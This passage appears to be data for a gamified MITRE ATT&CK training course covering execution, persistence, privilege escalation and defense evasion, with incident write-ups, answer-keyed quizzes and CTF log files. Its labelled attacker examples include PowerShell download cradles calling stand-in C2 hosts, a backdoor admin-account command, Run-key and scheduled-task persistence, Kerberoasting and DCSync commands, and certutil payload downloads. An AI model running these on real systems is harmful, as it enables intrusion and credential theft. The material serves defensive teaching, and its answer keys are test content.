          "Two controls then constrain what PowerShell can do:\n- Constrained Language Mode (CLM) blocks attacker use of .NET types and COM objects.\n- Paired with AppLocker or WDAC (Windows Defender Application Control), CLM shuts down most PowerShell-based execution.",
        ],
        codeExample: {
          label: "PowerShell attack patterns and detection",
          code: `# ATTACKER: Encoded PowerShell (obfuscated download cradle)
powershell.exe -NoP -NonI -W Hidden -Enc JABjAD0ATgBlAHcA...

# Decoded: IEX(New-Object Net.WebClient).DownloadString('http://c2.evil/payload.ps1')

# DEFENDER: Enable Script Block Logging via GPO
Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging" \`
  -Name "EnableScriptBlockLogging" -Value 1

# DEFENDER: Hunt for encoded commands in Event ID 4104
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" |
  Where-Object {$_.Id -eq 4104 -and $_.Message -match "EncodedCommand|DownloadString|IEX"}`,
        },
      },
      incident: {
        title: "NotPetya — WMI and PSEXEC for Execution (2017)",
        when: "June 27, 2017",
        where: "Ukraine, spreading globally — Maersk, FedEx, Merck, Mondelez, Reckitt Benckiser",
        impact: "$10B+ damages (highest cyberattack cost in history); first multilateral government attribution of Russia for destructive cyberattack",
        body: [
          "NotPetya ran entirely on legitimate Windows tools after initial access:\n- WMI (T1047) and PsExec (T1569.002) drove remote execution and lateral movement across the network.\n- Paired with dumped credentials, the chain looked identical to routine administration — so signature-based AV never fired.",
          "That LOLBin design made it devastating:\n- Maersk lost its entire global estate — 45,000 PCs and 4,000 servers wiped in hours.\n- One recently-logged-on admin was enough to cascade to every system they'd ever touched; FedEx's TNT lost $400M, with Merck and Reckitt Benckiser hundreds of millions more — $10B+ globally.",
          "Attribution and defensive baselines followed:\n- The US, UK, EU, Canada, Australia, and New Zealand jointly named Russian GRU Unit 74455 (Sandworm) in 2018 — the first multilateral call-out for a destructive attack — leading to six GRU indictments in 2020.\n- NotPetya made Script Block Logging (4104), WMI monitoring (Sysmon 19/20/21), and PsExec detection baseline SOC controls.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "NotPetya / Sandworm (GRU)", type: "attacker" },
          { label: "WMI + PsExec + Mimikatz", sub: "LOLBin execution chain", type: "system" },
          { label: "Windows Endpoints", sub: "Maersk / FedEx / Merck", type: "victim" },
          { label: "$10B Damages", sub: "wiper disguised as ransomware", type: "result" },
        ],
      },
      timeline: [
        { year: 2017, event: "NotPetya — WMI/PsExec LOLBin execution causes $10B global damage" },
        { year: 2019, event: "PowerShell Script Block Logging becomes standard SOC detection control", highlight: true },
        { year: 2022, event: "WDAC + Constrained Language Mode deployment grows in enterprise" },
        { year: 2024, event: "AI-powered behavioral execution detection reduces dwell time significantly" },
      ],
      keyTakeaways: [
        "Enable PowerShell Script Block Logging (Event 4104) — it decodes -EncodedCommand",
        "LOLBins use signed Microsoft tools — signature-based AV is blind to them",
        "Constrained Language Mode + AppLocker blocks most PowerShell execution techniques",
        "Behavioral detection (PowerShell → network connection) beats signature detection",
      ],
      references: [
        { title: "ATT&CK T1059.001 PowerShell", url: "https://attack.mitre.org/techniques/T1059/001/" },
        { title: "NotPetya Analysis (Wired)", url: "https://www.wired.com/story/notpetya-cyberattack-ukraine-russia-code-crashed-the-world/" },
      ],
    },
    quiz: {
      questions: [
        { id: "mitre-04-q1", type: "Tactic", challenge: "Running the code.", text: "What does the Execution tactic (TA0002) cover?", options: ["Techniques for running the attacker's code on a target system", "Gathering OSINT", "Encrypting files", "Buying domains"], correctIndex: 0, explanation: "Execution is about getting malicious code to actually run after access is gained." },
        { id: "mitre-04-q2", type: "LOLBins", challenge: "Living off the land.", text: "What are LOLBins?", options: ["Legitimate signed Microsoft binaries abused to run attacker code", "Unsigned malware files", "A type of firewall", "Encrypted backups"], correctIndex: 0, explanation: "certutil, mshta, regsvr32, etc. are trusted MS tools abused to evade signature-based AV." },
        { id: "mitre-04-q3", type: "Detection", challenge: "Seeing PowerShell.", text: "What does PowerShell Script Block Logging (Event ID 4104) capture?", options: ["The decoded content of commands, even when -EncodedCommand is used", "Only the username", "Network packets", "Nothing useful"], correctIndex: 0, explanation: "4104 logs the actual script content, defeating base64 obfuscation." },
        { id: "mitre-04-q4", type: "Obfuscation", challenge: "What -Enc does.", text: "What does the powershell.exe `-Enc` flag do?", options: ["Runs a base64-encoded command to obfuscate it", "Encrypts the hard drive", "Disables logging", "Speeds up the script"], correctIndex: 0, explanation: "-Enc passes a base64 command; defenders decode it via Event ID 4104." },
        { id: "mitre-04-q5", type: "Real Incident", challenge: "2017, $10B.", text: "How did NotPetya spread without dropping traditional malware?", options: ["Using legitimate Windows tools — WMI (T1047) and PsExec (T1569.002)", "Via infected USB drives only", "By guessing passwords", "Through a browser zero-day"], correctIndex: 0, explanation: "NotPetya's LOLBin execution chain looked like normal admin activity, evading signature AV." },
        { id: "mitre-04-q6", type: "Defense", challenge: "Locking PowerShell down.", text: "What combination blocks most PowerShell-based execution?", options: ["Constrained Language Mode + AppLocker/WDAC", "A longer password", "Disabling the firewall", "More RAM"], correctIndex: 0, explanation: "CLM restricts .NET/COM access; with app control it blocks most PowerShell attack techniques." },
        { id: "mitre-04-q7", type: "Why It Works", challenge: "Trusted by default.", text: "Why are LOLBins effective at evading defenses?", options: ["They're signed by Microsoft, so allowlisting and many AVs trust them", "They are invisible files", "They run only in safe mode", "They need no privileges"], correctIndex: 0, explanation: "Being legitimately signed lets them slip past application whitelisting." },
        { id: "mitre-04-q8", type: "Best Detection", challenge: "Behavior over signatures.", text: "Against LOLBins, what detection works best?", options: ["Behavioral detection (e.g. PowerShell making a network connection)", "Signature-based AV", "Checking file names only", "Ignoring signed binaries"], correctIndex: 0, explanation: "Since the binaries are legitimate, suspicious behavior is the reliable signal." },
      ],
    },
    ctf: {
      scenario: "A compromised workstation has attacker execution artifacts on disk. Three log files captured the execution chain. Read them to reconstruct the attack and collect the flag.",
      hint: "Execution logs are in /exec-logs. Read each log file.",
      hints: [
        "List /exec-logs to find the artifact files.",
        "The PowerShell log contains the first fragment.",
        "Read wmi.log and psexec.log for the remaining fragments.",
      ],
      files: {
        "/exec-logs/powershell-4104.log": `# PowerShell Script Block Log — Event ID 4104
# Timestamp: 2024-11-15 03:14:22 UTC

ScriptBlock: IEX(New-Object Net.WebClient).DownloadString('http://185.220.101.42/stage2.ps1')
CommandLine: powershell.exe -NoP -NonI -W Hidden -Enc SUVYKChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTg1LjIyMC4xMDEuNDIvc3RhZ2UyLnBzMScpKQ==
ParentProcess: WINWORD.EXE

Fragment-1: FLAG{TA0002_`,
        "/exec-logs/wmi.log": `# WMI Execution Log
# Timestamp: 2024-11-15 03:15:01 UTC

wmic.exe /node:192.168.1.45 process call create "powershell.exe -Enc SUVYKChOZXct..."
wmic.exe /node:192.168.1.67 process call create "powershell.exe -Enc SUVYKChOZXct..."
wmic.exe /node:192.168.1.23 process call create "powershell.exe -Enc SUVYKChOZXct..."

# WMI used to replicate execution to 3 additional hosts

Fragment-2: 3X3C_`,
        "/exec-logs/psexec.log": `# PsExec Execution Log
# Timestamp: 2024-11-15 03:16:44 UTC

psexec.exe \\\\DC01 -s cmd.exe /c "net user backdoor P@ss123 /add && net localgroup administrators backdoor /add"

# Backdoor admin account created on domain controller

Fragment-3: L0LB1N}`,
      },
      dirs: {
        "/": [{ name: "exec-logs", isDir: true }],
        "/exec-logs": [
          { name: "powershell-4104.log", isDir: false },
          { name: "wmi.log", isDir: false },
          { name: "psexec.log", isDir: false },
        ],
      },
      fragments: [
        { trigger: "/exec-logs/powershell-4104.log", value: "FLAG{TA0002_", label: "Fragment 1 — PowerShell Log" },
        { trigger: "/exec-logs/wmi.log", value: "3X3C_", label: "Fragment 2 — WMI Log" },
        { trigger: "/exec-logs/psexec.log", value: "L0LB1N}", label: "Fragment 3 — PsExec Log" },
      ],
    },
  },

  // ─── mitre-05: Persistence ────────────────────────────────────────────────────
  {
    epochId: "mitre",
    wonder: { name: "Mandiant HQ", location: "Reston, Virginia", era: "Present Day", emoji: "🔄" },
    id: "mitre-05",
    order: 5,
    title: "The Squatter",
    subtitle: "TA0003 Persistence — registry run keys and scheduled tasks",
    category: "cybersecurity",
    xp: 200,
    badge: { id: "mitre-badge-05", name: "Persistence Engineer", emoji: "🔄" },
    challengeType: "ctf",
    info: {
      tagline: "Initial access is rented. Persistence is ownership.",
      year: 2014,
      overview: [
        "Persistence (TA0003) keeps an attacker's foothold alive through reboots, password resets, and interruptions:\n- Without it, losing the initial shell means starting the intrusion over.\n- With it, the attacker survives reboots, credential changes, and even some remediation attempts.",
        "The common techniques plant a relaunch trigger somewhere the OS will honor:\n- T1547.001 — Registry Run keys (HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run).\n- T1053.005 — Scheduled Tasks (schtasks.exe).\n- T1543.003 — Windows Services (sc.exe create).\n- T1037 — boot/logon scripts; T1505.003 — a web shell on a web server.",
        "Detection means baselining startup state and watching for additions:\n- Monitor registry Run keys for new entries.\n- Audit scheduled-task creation (Event ID 4698) and new services (Event ID 7045).\n- Keep a baseline of expected startup items with Autoruns (Sysinternals) or EDR persistence inventory.",
      ],
      technical: {
        title: "Persistence Mechanism Detection",
        body: [
          "Scheduled-task events are a primary detection point:\n- Event ID 4698 (created) and 4702 (updated) flag new tasks.\n- Filter for tasks made by non-SYSTEM accounts, pointing to temp directories or encoded commands, or triggering on logon/startup.",
          "Registry Run keys are the other hot spot:\n- HKCU and HKLM Run/RunOnce keys are the most common persistence locations.\n- Sysmon Event ID 13 (registry value set) on those paths catches additions; Autoruns gives a complete inventory.",
        ],
        codeExample: {
          label: "Persistence creation and detection",
          code: `# ATTACKER: Registry Run Key persistence
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" ^
  /v "WindowsUpdate" /t REG_SZ ^
  /d "powershell.exe -WindowStyle Hidden -Enc <payload>"

# ATTACKER: Scheduled Task persistence
schtasks /create /tn "\\Microsoft\\Windows\\Update\\CheckUpdate" ^
  /tr "powershell.exe -Enc <payload>" /sc onlogon /ru SYSTEM

# DEFENDER: Hunt new Run Key entries (Event ID Sysmon 13)
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
  Where-Object {$_.Id -eq 13 -and $_.Message -match "CurrentVersion\\\\Run"}

# DEFENDER: Audit scheduled tasks for suspicious entries
Get-ScheduledTask | Where-Object {$_.TaskPath -notmatch "\\\\Microsoft\\\\"} |
  Select-Object TaskName, TaskPath, @{n='Action';e={$_.Actions.Execute}}`,
        },
      },
      incident: {
        title: "APT1 / Comment Crew — Long-Term Persistence via Services (2006–2013)",
        when: "2006–2013",
        where: "141 US Defense, Aerospace, and Technology firms",
        impact: "Terabytes of IP stolen over 7 years; 356-day average dwell time; Mandiant APT1 report triggers first nation-state indictments",
        body: [
          "APT1 (Comment Crew, PLA Unit 61398) sat in victim networks for an average of 356 days — nearly a year:\n- They layered Windows Services, registry Run keys, and web shells on internet-facing servers.\n- When one mechanism was found and removed, the others kept the access alive (the 2013 Mandiant report catalogued 46 malware families and 20+ persistence techniques).",
          "That layering defines the remediation lesson:\n- You must find all persistence at once, or the attacker just falls back to the spare.\n- Real hunting pairs endpoint forensics (registry, tasks, services, startup) with network analysis (beaconing, DNS) — removing one while others remain is pruning, not remediation.",
          "The Feb 18, 2013 Mandiant APT1 report was a watershed in public reporting:\n- It published technical attribution of a nation-state campaign with named operators (UglyGorilla, SUPERHARD) and photos of Unit 61398's Shanghai building.\n- It led to the first-ever indictments of state hackers (five PLA members, May 2014) and popularized persistence hunting as a discipline.",
        ],
      },
      diagram: {
        nodes: [
          { label: "APT1 (PLA Unit 61398)", sub: "Chinese state-sponsored", type: "attacker" },
          { label: "Services + Registry + Web Shells", sub: "layered persistence", type: "system" },
          { label: "141 US Companies", sub: "avg 356-day dwell time", type: "victim" },
          { label: "IP Theft", sub: "terabytes over 7 years", type: "result" },
        ],
      },
      timeline: [
        { year: 2006, event: "APT1 operations begin — US defense and tech sector targeted" },
        { year: 2013, event: "Mandiant APT1 report published — 141 victims, 46 malware families", highlight: true },
        { year: 2018, event: "Sysmon v9 adds Registry Event monitoring — persistence detection improves" },
        { year: 2023, event: "EDR persistence inventory becomes standard enterprise security control" },
      ],
      keyTakeaways: [
        "Attackers layer persistence — finding one mechanism doesn't mean they're gone",
        "Monitor Event ID 4698 (Scheduled Task Created) and Sysmon 13 (Registry Set)",
        "Autoruns.exe is the gold standard for manual persistence hunting",
        "Average APT dwell time is 197 days — persistence mechanisms enable long-term access",
      ],
      references: [
        { title: "ATT&CK TA0003 Persistence", url: "https://attack.mitre.org/tactics/TA0003/" },
        { title: "Mandiant APT1 Report", url: "https://www.mandiant.com/resources/reports/apt1-exposing-one-of-chinas-cyber-espionage-units" },
      ],
    },
    quiz: {
      questions: [
        { id: "mitre-05-q1", type: "Tactic", challenge: "Staying in.", text: "What does the Persistence tactic (TA0003) achieve?", options: ["Maintaining access across reboots, logouts, and credential changes", "Gaining the first foothold", "Encrypting data", "Scanning the network"], correctIndex: 0, explanation: "Persistence keeps the attacker's access alive after interruptions." },
        { id: "mitre-05-q2", type: "Technique", challenge: "A classic autostart.", text: "Adding an entry to HKCU\\...\\CurrentVersion\\Run is which sub-technique?", options: ["T1547.001 — Registry Run Keys / Startup Folder", "T1566 — Phishing", "T1486 — Data Encrypted for Impact", "T1190 — Exploit Public-Facing App"], correctIndex: 0, explanation: "Run keys auto-launch the payload at logon — a very common persistence method." },
        { id: "mitre-05-q3", type: "Detection", challenge: "Watch the scheduler.", text: "Which Windows Event ID flags a new scheduled task (a key persistence point)?", options: ["Event ID 4698", "Event ID 1102", "Event ID 4624", "Event ID 5140"], correctIndex: 0, explanation: "4698 logs scheduled-task creation, a frequent persistence mechanism." },
        { id: "mitre-05-q4", type: "Hunting Tool", challenge: "The gold standard.", text: "Which Sysinternals tool inventories all persistence mechanisms on a Windows host?", options: ["Autoruns.exe", "Notepad.exe", "Calc.exe", "Paint.exe"], correctIndex: 0, explanation: "Autoruns enumerates run keys, tasks, services, and more — the manual persistence-hunting standard." },
        { id: "mitre-05-q5", type: "Real Incident", challenge: "APT1, ~356 days.", text: "How did APT1 stay in victim networks for ~356 days on average?", options: ["By layering 20+ persistence techniques so removing one left others active", "By never being detected at all", "By using a single backdoor", "By physical access"], correctIndex: 0, explanation: "Layered persistence meant pruning one mechanism didn't evict them." },
        { id: "mitre-05-q6", type: "Key Insight", challenge: "Don't stop at one.", text: "Why isn't removing one persistence mechanism enough?", options: ["Sophisticated attackers layer several — you must find them all", "It always fully evicts them", "Persistence can't be layered", "Reboots remove all persistence"], correctIndex: 0, explanation: "Layered persistence survives partial remediation; comprehensive hunting is required." },
        { id: "mitre-05-q7", type: "Concept", challenge: "Access vs ownership.", text: "What's the difference between initial access and persistence?", options: ["Access is the entry; persistence is keeping it across interruptions", "They're identical", "Persistence comes first", "Access is for defenders only"], correctIndex: 0, explanation: "'Initial access is rented; persistence is ownership.'" },
        { id: "mitre-05-q8", type: "Detection", challenge: "Watching the registry.", text: "Which Sysmon event helps detect new Run-key persistence?", options: ["Event ID 13 (Registry value set)", "Event ID 1 only", "Event ID 22 only", "None — registry can't be monitored"], correctIndex: 0, explanation: "Sysmon Event 13 logs registry value sets, catching Run-key additions." },
      ],
    },
    ctf: {
      scenario: "An IR team found persistence artifacts on a compromised server. Three evidence files document the persistence mechanisms. Collect the fragments to document the full persistence footprint.",
      hint: "Persistence evidence is in /persist-evidence. Read each artifact file.",
      hints: [
        "List /persist-evidence to find the forensic files.",
        "The registry dump contains the first fragment.",
        "Read the scheduled task and service entries for the rest.",
      ],
      files: {
        "/persist-evidence/registry-runkeys.txt": `# Registry Run Key Dump — HKCU\\..\\CurrentVersion\\Run
# Forensic export — infected workstation WS-ACME-047

WindowsUpdate  REG_SZ  powershell.exe -WindowStyle Hidden -Enc SUVYKChOZXct...
AdobeUpdater   REG_SZ  C:\\Users\\jsmith\\AppData\\Local\\Temp\\svchost32.exe
OneDriveSync   REG_SZ  regsvr32.exe /s /u /i:http://185.220.101.42/payload.sct scrobj.dll

Fragment-1: FLAG{TA0003_`,
        "/persist-evidence/scheduled-tasks.txt": `# Scheduled Task Forensic Export
# Suspicious tasks (non-Microsoft)

Task: \\Microsoft\\Windows\\Update\\CheckUpdate
  Action: powershell.exe -Enc SUVYKChOZXct...
  Trigger: At logon — any user
  Created: 2024-11-15 03:16:02 (matches initial compromise timestamp)

Fragment-2: P3RS1ST_`,
        "/persist-evidence/services.txt": `# Windows Services — Suspicious Entries (Event ID 7045)

Service: WinDefendSvc2
  ImagePath: C:\\Windows\\Temp\\svchost.exe -k netsvcs
  Start: Automatic
  Created: 2024-11-15 03:17:44

Note: Legitimate WinDefend service uses different binary path

Fragment-3: L4Y3R}`,
      },
      dirs: {
        "/": [{ name: "persist-evidence", isDir: true }],
        "/persist-evidence": [
          { name: "registry-runkeys.txt", isDir: false },
          { name: "scheduled-tasks.txt", isDir: false },
          { name: "services.txt", isDir: false },
        ],
      },
      fragments: [
        { trigger: "/persist-evidence/registry-runkeys.txt", value: "FLAG{TA0003_", label: "Fragment 1 — Registry Run Keys" },
        { trigger: "/persist-evidence/scheduled-tasks.txt", value: "P3RS1ST_", label: "Fragment 2 — Scheduled Tasks" },
        { trigger: "/persist-evidence/services.txt", value: "L4Y3R}", label: "Fragment 3 — Services" },
      ],
    },
  },

  // ─── mitre-06: Privilege Escalation ──────────────────────────────────────────
  {
    epochId: "mitre",
    wonder: { name: "SolarWinds HQ", location: "Austin, Texas", era: "Present Day", emoji: "⬆️" },
    id: "mitre-06",
    order: 6,
    title: "The Crown Grabber",
    subtitle: "TA0004 Privilege Escalation — from user to SYSTEM",
    category: "cybersecurity",
    xp: 200,
    badge: { id: "mitre-badge-06", name: "Privilege Escalator", emoji: "⬆️" },
    challengeType: "ctf",
    info: {
      tagline: "User access opens a door. SYSTEM access owns the building.",
      year: 2020,
      overview: [
        "Privilege Escalation (TA0004) is the climb from where the attacker landed to the keys of the kingdom:\n- A standard user pushes to local admin, then SYSTEM (Windows) or root (Linux).\n- In Active Directory, the prize is Domain Admin.",
        "The common escalation paths abuse credentials, bugs, or tokens:\n- T1078 (Valid Accounts) — reusing harvested legitimate credentials.\n- T1068 (Exploitation for Privilege Escalation) — unpatched kernel or service flaws.\n- T1134 (Access Token Manipulation) — impersonating SYSTEM tokens.\n- T1484 (Domain Policy Modification) — abusing Group Policy.",
        "Active Directory offers especially sharp escalation routes:\n- DCSync replicates the AD database to grab every hash.\n- PrintNightmare (CVE-2021-34527) and AS-REP Roasting (accounts with Kerberos pre-auth off) can take a standard domain user straight to Domain Admin.",
      ],
      technical: {
        title: "Active Directory Privilege Escalation Paths",
        body: [
          "DCSync (T1003.006) weaponizes a replication right:\n- A user with Replicating Directory Changes can pull every password hash from a Domain Controller — ntds.dit extraction without touching the DC.\n- Detect it via Event ID 4662 for DS-Replication-Get-Changes from anything other than a DC.",
          "Kerberoasting (T1558.003) cracks service accounts offline:\n- Request a service ticket for any SPN, then crack it at leisure — service accounts often have weak, unmonitored passwords.\n- Detect it via Event ID 4769 for RC4 tickets (etype 23) on service accounts.",
        ],
        codeExample: {
          label: "AD privilege escalation detection",
          code: `# ATTACKER: Kerberoasting — request service tickets for offline cracking
# Using Rubeus
Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt

# ATTACKER: DCSync — dump all password hashes
mimikatz.exe "lsadump::dcsync /domain:acme.local /all /csv"

# DEFENDER: Detect Kerberoasting — Event ID 4769 with RC4 encryption
Get-WinEvent -LogName Security | Where-Object {
  $_.Id -eq 4769 -and
  $_.Message -match "Ticket Encryption Type:.*0x17"  # RC4 = etype 23
}

# DEFENDER: Detect DCSync — Event ID 4662 DS-Replication
Get-WinEvent -LogName Security | Where-Object {
  $_.Id -eq 4662 -and
  $_.Message -match "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"  # DS-Replication GUID
}`,
        },
      },
      incident: {
        title: "SolarWinds — SAML Token Forgery for Cloud Privilege Escalation (2020)",
        when: "2020",
        where: "SolarWinds victim organizations — Microsoft 365 / Azure AD for US government and Fortune 500 tenants",
        impact: "US Treasury, Justice, State Department email compromised; Microsoft published hybrid identity hardening guidance; ADFS certificate protection elevated to Tier 0",
        body: [
          "After SUNBURST gave it on-prem access, APT29 jumped to the cloud with Golden SAML (T1606.002):\n- It stole the ADFS token-signing certificate from the victim's on-prem federation server.\n- With that cert it forged SAML tokens to authenticate as any Microsoft 365 user — global admins included — bypassing MFA entirely, because M365 trusts tokens signed by the org's own ADFS cert.",
          "That on-prem-to-cloud-admin path is among the most dangerous in hybrid environments:\n- APT29 read the email of senior US Treasury, Justice, State, DHS, and Energy officials for months.\n- The breach surfaced only in December 2020, when FireEye — itself compromised via the same supply chain — found it.",
          "Golden SAML reset hybrid-identity security architecture:\n- Microsoft's 'Protecting Microsoft 365 from On-Premises Attacks' urged treating on-prem AD and Azure AD as separate trust boundaries, with token-signing certs in HSMs and Extended Protection enabled.\n- NSA/CISA guidance and Microsoft now class ADFS signing certs as Tier 0 — protected like domain-admin credentials.",
        ],
      },
      diagram: {
        nodes: [
          { label: "APT29", sub: "SUNBURST initial access", type: "attacker" },
          { label: "ADFS + Golden SAML", sub: "T1606.002 token forgery", type: "system" },
          { label: "Microsoft 365 Global Admin", sub: "bypasses MFA", type: "victim" },
          { label: "US Gov Email Access", sub: "Treasury, Justice, State", type: "result" },
        ],
      },
      timeline: [
        { year: 2017, event: "CyberArk documents Golden SAML attack — ADFS token forgery technique" },
        { year: 2020, event: "APT29 uses Golden SAML against SolarWinds victims — full cloud escalation", highlight: true },
        { year: 2021, event: "Microsoft releases guidance on detecting Golden SAML and ADFS hardening" },
        { year: 2022, event: "Hybrid identity hardening (protect ADFS certs) becomes standard control" },
      ],
      keyTakeaways: [
        "Kerberoasting + DCSync are the two most common AD privilege escalation paths",
        "Monitor Event 4769 (RC4 tickets) for Kerberoasting; Event 4662 for DCSync",
        "Golden SAML: ADFS cert theft enables full cloud admin bypass of MFA",
        "Protect ADFS token-signing certificates as Tier 0 (equivalent to domain admin)",
      ],
      references: [
        { title: "ATT&CK TA0004 Privilege Escalation", url: "https://attack.mitre.org/tactics/TA0004/" },
        { title: "Golden SAML Attack (CyberArk)", url: "https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps" },
      ],
    },
    quiz: {
      questions: [
        { id: "mitre-06-q1", type: "Tactic", challenge: "From user to ruler.", text: "What does the Privilege Escalation tactic (TA0004) achieve?", options: ["Gaining higher permissions — e.g. from a normal user to admin/SYSTEM", "Sending phishing emails", "Encrypting files", "Buying infrastructure"], correctIndex: 0, explanation: "Privilege escalation raises the attacker's access level within the environment." },
        { id: "mitre-06-q2", type: "Kerberoasting", challenge: "Cracking service accounts.", text: "In Kerberoasting (T1558.003), what does the attacker obtain and do?", options: ["Service tickets encrypted with the service account's hash, then crack them offline", "The plaintext admin password directly", "A list of all users", "A new domain"], correctIndex: 0, explanation: "Requested TGS tickets are cracked offline to recover service-account passwords." },
        { id: "mitre-06-q3", type: "DCSync", challenge: "Replicating secrets.", text: "What does DCSync (T1003.006) let an attacker do?", options: ["Remotely pull AD password hashes using replication rights — no need to touch the DC directly", "Physically copy NTDS.dit from the server room", "Reset everyone's password", "Disable the firewall"], correctIndex: 0, explanation: "DCSync abuses replication permissions to extract hashes remotely." },
        { id: "mitre-06-q4", type: "Golden SAML", challenge: "Bypassing the cloud login.", text: "Golden SAML steals which item to forge access to Microsoft 365?", options: ["The ADFS token-signing certificate", "A user's phone", "The DNS zone file", "A TLS session cookie"], correctIndex: 0, explanation: "With the ADFS signing cert, attackers forge SAML tokens for any user." },
        { id: "mitre-06-q5", type: "Impact", challenge: "Why Golden SAML is brutal.", text: "Which control does Golden SAML bypass?", options: ["Multi-Factor Authentication — the forged token is trusted without credential checks", "Disk encryption", "The spam filter", "The CPU cache"], correctIndex: 0, explanation: "A forged, trusted SAML assertion skips the login (and MFA) entirely." },
        { id: "mitre-06-q6", type: "Detection", challenge: "RC4 red flag.", text: "Why is Event 4769 with RC4 (etype 23) a Kerberoasting indicator?", options: ["Modern environments should use AES; RC4 service tickets suggest offline cracking attempts", "RC4 means the network is fast", "It indicates a successful patch", "It's always normal"], correctIndex: 0, explanation: "RC4-encrypted service tickets are crackable, so requests for them are suspicious." },
        { id: "mitre-06-q7", type: "Real Incident", challenge: "SolarWinds, cloud pivot.", text: "APT29 used Golden SAML during SolarWinds to…", options: ["Forge SAML assertions and access M365 as any user, bypassing MFA", "Encrypt the build server", "Phish home users", "Scan the internet"], correctIndex: 0, explanation: "Stealing the ADFS signing cert let them impersonate cloud users at will." },
        { id: "mitre-06-q8", type: "Defense", challenge: "Protect the crown jewels.", text: "How should ADFS token-signing certificates be treated?", options: ["As Tier 0 assets, equivalent in sensitivity to Domain Admin", "Like any normal file", "Stored on every workstation", "Emailed to admins"], correctIndex: 0, explanation: "Compromise of that cert equals full cloud-identity compromise, so it's top-tier." },
      ],
    },
    ctf: {
      scenario: "An attacker escalated from user to Domain Admin on a victim network. Three forensic artifacts show the escalation chain. Collect the fragments to document the path.",
      hint: "Escalation artifacts are in /privesc. Read each evidence file.",
      hints: [
        "List /privesc to find the forensic files.",
        "The Kerberoast output contains the first fragment.",
        "Read dcsync.log and golden-saml.txt for the remaining pieces.",
      ],
      files: {
        "/privesc/kerberoast-hashes.txt": `# Kerberoast Output — Rubeus.exe
# Event ID 4769 triggered (RC4 etype 23)

$krb5tgs$23$*MSSQLSvc$acme.local$MSSQL/db01.acme.local:1433*$a3f9b2c1...
$krb5tgs$23$*SPNBackup$acme.local$backup/backup01.acme.local*$d4e5f678...

# Cracked offline: MSSQLSvc password = "Sql2019!"
# Using cracked credential to authenticate as service account

Fragment-1: FLAG{TA0004_`,
        "/privesc/dcsync.log": `# Mimikatz DCSync Output
# lsadump::dcsync /domain:acme.local /all /csv

Administrator:500:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DA_service:1234:aad3b435b51404ee:7f4a2f0a3b5c6d1e...:::

# NTLM hash for Administrator extracted — pass-the-hash to DC

Fragment-2: PR1VU_3SC_`,
        "/privesc/golden-saml.txt": `# Golden SAML Attack Log
# ADFS token-signing certificate extracted from ADFS server

Certificate: CN=ADFS Signing - acme.local (exported via ADFS service account)
Tool: ADFSDump → AADInternals

Forged SAML token for: globaladmin@acme.onmicrosoft.com
Authentication: SUCCESS — MFA bypassed via trusted SAML assertion
Access: Microsoft 365 Global Admin — all mailboxes, SharePoint, Azure AD

Fragment-3: DA}`,
      },
      dirs: {
        "/": [{ name: "privesc", isDir: true }],
        "/privesc": [
          { name: "kerberoast-hashes.txt", isDir: false },
          { name: "dcsync.log", isDir: false },
          { name: "golden-saml.txt", isDir: false },
        ],
      },
      fragments: [
        { trigger: "/privesc/kerberoast-hashes.txt", value: "FLAG{TA0004_", label: "Fragment 1 — Kerberoast" },
        { trigger: "/privesc/dcsync.log", value: "PR1VU_3SC_", label: "Fragment 2 — DCSync" },
        { trigger: "/privesc/golden-saml.txt", value: "DA}", label: "Fragment 3 — Golden SAML" },
      ],
    },
  },

  // ─── mitre-07: Defense Evasion ────────────────────────────────────────────────
  {
    epochId: "mitre",
    wonder: { name: "CrowdStrike HQ", location: "Austin, Texas", era: "Present Day", emoji: "👻" },
    id: "mitre-07",
    order: 7,
    title: "The Ghost",
    subtitle: "TA0005 Defense Evasion — LOLBins and living in the shadows",
    category: "cybersecurity",
    xp: 200,
    badge: { id: "mitre-badge-07", name: "Ghost Operator", emoji: "👻" },
    challengeType: "ctf",
    info: {
      tagline: "The best attacker is invisible. Defense evasion is the art of not being seen.",
      year: 2019,
      overview: [
        "Defense Evasion (TA0005) is ATT&CK's broadest tactic — 42 techniques for staying unseen:\n- T1027 (Obfuscated Files) — encoding, encryption, packing.\n- T1055 (Process Injection) — running code inside a legitimate process's memory.\n- T1070 (Indicator Removal) — clearing logs; T1562 (Impair Defenses) — disabling AV/EDR; T1218 (Signed Binary Proxy Execution) — LOLBins.",
        "LOLBins are signed Microsoft executables bent to evasion, so whitelisting trusts them:\n- mshta.exe runs HTA files from URLs; regsvr32.exe loads COM objects from URLs.\n- certutil.exe downloads and decodes files; rundll32.exe executes DLLs directly.",
        "Modern evasion increasingly attacks the EDR sensor itself:\n- Killing EDR processes and unloading its kernel driver.\n- BYOVD (Bring Your Own Vulnerable Driver) patches EDR from the kernel — used by Lazarus Group and ALPHV ransomware operators.",
      ],
      technical: {
        title: "LOLBin Proxy Execution and EDR Bypass",
        body: [
          "Two classic LOLBins each have a clean detection:\n- certutil.exe -decode (T1140) unpacks base64 payloads — flag certutil making outbound HTTP or using -decode/-urlcache.\n- mshta.exe (T1218.005) runs remote VBScript/JScript — block it from outbound network connections by firewall rule.",
          "BYOVD (T1014) reaches kernel space through a trusted-but-flawed driver:\n- The attacker loads a known-vulnerable signed driver, then uses its bug to write kernel memory and patch the EDR's callbacks.\n- Defense: allow only HVCI (Hypervisor-Protected Code Integrity) signed drivers, which blocks all BYOVD.",
        ],
        codeExample: {
          label: "LOLBin abuse patterns and detections",
          code: `# ATTACKER: certutil download and decode
certutil.exe -urlcache -split -f http://c2.evil/payload.b64 C:\\Windows\\Temp\\p.b64
certutil.exe -decode C:\\Windows\\Temp\\p.b64 C:\\Windows\\Temp\\payload.exe

# ATTACKER: regsvr32 squiblydoo (T1218.010)
